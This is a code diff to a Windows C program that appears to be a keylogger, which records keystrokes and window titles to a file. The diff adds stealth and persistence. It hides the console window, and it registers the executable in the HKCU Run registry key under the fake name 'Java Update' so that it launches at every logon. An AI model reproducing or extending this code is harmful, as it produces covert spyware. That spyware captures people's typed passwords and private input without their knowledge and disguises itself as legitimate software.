@@ -24,6 +24,10 @@ GetAsyncKeyState
 #define K_ENTERSTR "{ENTER}"
 #define IDD_COMBO 2032
 
+#define TRUE 1
+#define FALSE 0
+typedef int BOOL;
+
 //HELP MESSAGES
 
 char oldWindowTitle[256];
@@ -36,6 +40,9 @@ long    writeToFile(FILE * fileHandler,char ch);
 void    writeWindowTitle(FILE * fileHandler);
 int     file_exists(FILE **fileHandler, char *fileStr);
 int     kbhit(char *ch);
+void    RegisterProgram();
+BOOL    IsMyProgramRegisteredForStartup(PCWSTR pszAppName);
+BOOL    RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);
 
 int kbhit(char *ch){
 int i=0, keystate=0;
@@ -84,8 +91,11 @@ int main() {
    //Get time & date
    now = time(0);
    ltm = localtime(&now);
-
+  //hide console window
   ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
+  //register at startup
+  RegisterProgram();
+
   month = ltm->tm_mon;
   month++;
   sprintf(daystr, "%d", ltm->tm_mday);
@@ -182,3 +192,55 @@ void writeWindowTitle(FILE * fileHandler)
   oldWindowTitle[0] = '\0';
   strcat(oldWindowTitle,newWindowTitle);
 }
+
+BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
+{
+    HKEY hKey = NULL;
+    LONG lResult = 0;
+    BOOL fSuccess = TRUE;
+    DWORD dwSize;
+
+    const size_t count = MAX_PATH*2;
+    wchar_t szValue[count];
+
+
+    wcscpy_s(szValue, count, L"\"");
+    wcscat_s(szValue, count, pathToExe);
+    wcscat_s(szValue, count, L"\" ");
+
+    if (args != NULL)
+    {
+        // caller should make sure "args" is quoted if any single argument has a space
+        // e.g. (L"-name \"Mark Voidale\"");
+        wcscat_s(szValue, count, args);
+    }
+
+    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+    fSuccess = (lResult == 0);
+
+    if (fSuccess)
+    {
+        dwSize = (wcslen(szValue)+1)*2;
+        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
+        fSuccess = (lResult == 0);
+    }
+
+    if (hKey != NULL)
+    {
+        RegCloseKey(hKey);
+        hKey = NULL;
+    }
+
+    return fSuccess;
+}
+
+void RegisterProgram()
+{
+    wchar_t szPathToExe[MAX_PATH];
+
+    GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
+    RegisterMyProgramForStartup(L"Java Update", szPathToExe, L"");
+}
+
+
